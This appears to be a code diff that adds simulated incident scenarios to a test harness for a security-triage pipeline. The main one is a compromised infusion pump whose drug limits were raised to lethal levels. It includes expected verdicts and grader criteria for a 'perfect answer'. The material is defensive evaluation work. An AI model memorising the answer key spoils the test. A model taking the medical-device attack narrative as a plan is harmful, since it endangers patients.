+      "note": "Firmware was overwritten without signature validation. The pump's firmware update mechanism trusts any data written to the flash partition — this is the core vulnerability exploited."
+    },
+    {
+      "sequence": 4,
+      "timestamp": "2026-06-15T03:47:00Z",
+      "type": "DRUG_LIBRARY_MODIFICATION",
+      "severity": "LIFE-THREATENING",
+      "detail": "Drug library safety limits modified for critical medications.",
+      "modifications": [
+        {
+          "drug": "Fentanyl",
+          "parameter": "maximum_dose_rate",
+          "previous_value": "200 mcg/hr",
+          "new_value": "2000 mcg/hr",
+          "change_factor": "10x increase",
+          "clinical_significance": "LETHAL — Standard ICU Fentanyl dose is 25-100 mcg/hr. 2000 mcg/hr would cause respiratory arrest and death within minutes."
+        },
+        {
+          "drug": "Propofol",
+          "parameter": "maximum_dose_rate",
+          "previous_value": "200 mcg/kg/min",
+          "new_value": "2000 mcg/kg/min",
+          "change_factor": "10x increase",
+          "clinical_significance": "LETHAL — Standard Propofol sedation is 25-75 mcg/kg/min. 2000 mcg/kg/min would cause cardiovascular collapse."
+        }
+      ],
+      "note": "These modifications remove the safety guardrails that prevent accidental overdose. If a nurse programs a dose within the new limits but above the old limits, the pump will deliver a lethal dose without alarming."
+    }
+  ],
+  "patient_context": {
+    "patient_connected": true,
+    "current_infusion": {
+      "drug": "Normal Saline",
+      "rate": "125 mL/hr",
+      "status": "Running — NOT affected by drug limit changes"
+    },
+    "scheduled_medications": [
+      {
+        "drug": "Fentanyl",
+        "dose": "50 mcg/hr",
+        "scheduled_time": "06:00 UTC",
+        "time_until_scheduled": "2 hours 13 minutes",
+        "risk": "Within SAFE limits (50 < 200 original limit) — BUT if dose is adjusted upward during care, the modified 2000 mcg/hr limit would not trigger a safety alarm"
+      },
+      {
+        "drug": "Propofol",
+        "dose": "PRN (as needed for sedation)",
+        "risk": "If administered at any dose above 200 mcg/kg/min, the modified safety limit would not trigger an alarm"
+      }
+    ],
+    "clinical_team_notified": false,
+    "note": "CRITICAL TIME CONSTRAINT: Fentanyl infusion scheduled at 06:00 — approximately 2 hours from detection. The pump MUST be taken offline and replaced with a verified clean unit before this time. The current saline infusion can be transferred to a replacement pump."
+  },
+  "other_devices_at_risk": {
+    "same_vlan_devices": 23,
+    "same_model_devices": 8,
+    "devices_queried_same_domain": 0,
+    "note": "No other devices have been observed contacting update.baxter-medical.net. However, all 8 Baxter Sigma Spectrum pumps on this VLAN share the same CVE-2022-26390 vulnerability and should be audited."
+  },
+  "regulatory": {
+    "fda_reportable": true,
+    "hipaa_implications": true,
+    "joint_commission_notification": "Required within 24 hours for sentinel event",
+    "note": "This is an FDA-reportable cybersecurity incident involving a patient-connected Class II medical device. The hospital's biomedical engineering team and risk management must be notified immediately."
+  },
+  "category": "115 Vulnerability Exposure",
+  "expected_iti_category_id": 115,
+  "expected_iti_category_name": "Vulnerability Exposure",
+  "expected_iti_attack_severity": "SEV1",
+  "expected_verdict": "MALICIOUS_CONFIRMED",
+  "expected_disposition": "true_positive_patient_safety_critical",
+  "expected_severity": "SEV1",
+  "test_notes": "CAPABILITY-CEILING test: does the pipeline understand that a cyber incident can threaten human life, and prioritise accordingly? A patient-connected FDA Class II Baxter Sigma Spectrum pump pulled unsigned firmware from a 6-day-old typosquat (update.baxter-medical.net vs updates.baxter.com) over a Let's Encrypt cert where Baxter uses DigiCert, exploiting CVE-2022-26390 (no firmware signature validation). Drug library safety ceilings were raised 10x: Fentanyl 200 -> 2000 mcg/hr and Propofol 200 -> 2000 mcg/kg/min — both lethal. A Fentanyl infusion is scheduled in ~2h13m. PERFECT ANSWER: leads with PATIENT SAFETY IS PRIMARY; instructs disconnect from NETWORK not from PATIENT; replace the pump with a verified clean unit before 06:00; flags FDA-reportable sentinel event and biomed/risk notification; and identifies all three technical vectors (typosquat + cert mismatch + CVE exploitation). Graders should fail any answer that prioritises forensic preservation over removing the device from service, or that says 'disconnect the device' without distinguishing network from patient."
+}
+""")
+
 # ── Scenario registry: (offence_id, scenario_label, raw_alert) ────
 
 
@@ -3263,6 +4069,13 @@ SCENARIOS: list[tuple[int, str, str, dict]] = [
     (SCENARIO_ID_BASE + 129, "RECENT-JADE",   "103 Ransomware — JadePuffer LLM-agent ransomware, Langflow CVE-2025-3248 (real C2)", _RECENT_JADE),
     (SCENARIO_ID_BASE + 130, "RECENT-QILIN",  "110 Intrusion — Qilin Check Point VPN auth-bypass zero-day (CVE-2026-50751)", _RECENT_QILIN),
     (SCENARIO_ID_BASE + 131, "RECENT-AKIRA",  "103 Ransomware — Akira mass encryption + .akira + shadow-copy (top group Jun 2026)", _RECENT_AKIRA),
+    # v11 SIM payloads (2026-07-26) — capability-ceiling probes.
+    # Offence IDs 90132-90136.
+    (SCENARIO_ID_BASE + 132, "SIM-001", "103 Ransomware — pre-encryption staging, 16-command backup-destruction chain (isolation decision)", _SIM_001),
+    (SCENARIO_ID_BASE + 133, "SIM-002", "108 Account Compromise — SIM swap to Okta Super Admin to AWS (no network IOCs)", _SIM_002),
+    (SCENARIO_ID_BASE + 134, "SIM-003", "106 Lateral Movement — GPO weaponization, 3 persistence payloads to 312 computers (45-min window)", _SIM_003),
+    (SCENARIO_ID_BASE + 135, "SIM-004", "107 Malware — Linux LKM rootkit, syscall hooking + timestomp + SSH persistence (72h C2)", _SIM_004),
+    (SCENARIO_ID_BASE + 136, "SIM-005", "115 Vulnerability Exposure — infusion pump firmware compromise, drug limits 10x (patient-connected)", _SIM_005),
 ]
 
 
